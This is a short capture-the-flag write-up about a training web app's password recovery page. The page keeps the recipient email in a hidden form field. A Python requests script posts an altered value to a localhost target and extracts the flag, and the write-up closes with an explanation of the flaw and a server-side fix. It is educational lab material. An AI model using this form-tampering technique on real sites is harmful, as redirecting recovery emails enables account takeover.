# How

The page `/index.php?page=recover` is supposed to be a password recovery page.

But it lacks a field to type in our email address.

Pressing CTRL+U reveals that there is a hidden field named `email` :

```html
<form action="#" method="POST">
	<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15"> <!-- Hidden field -->
	<input type="submit" name="Submit" value= "Submit">
</form>
```

So, you can just change the value using your browser's dev tools and submit the form.

Or use this code :

```python
import requests
import re

FLAG_REGEX = re.compile(r'(?<=The flag is : )\w+')

data = {
    'mail': 'email@example.com',
    'Submit': 'Submit',
}

response = requests.post('http://localhost:4242/index.php?page=recover', data=data)

print("Flag:", FLAG_REGEX.search(response.text)[0])
```

# Why

In any case, never use hidden fields to store constants in your forms, even if not visible a user can still change their values.

# Fix

Instead, place the constant in your server's code and use it to pre-fill the field at most.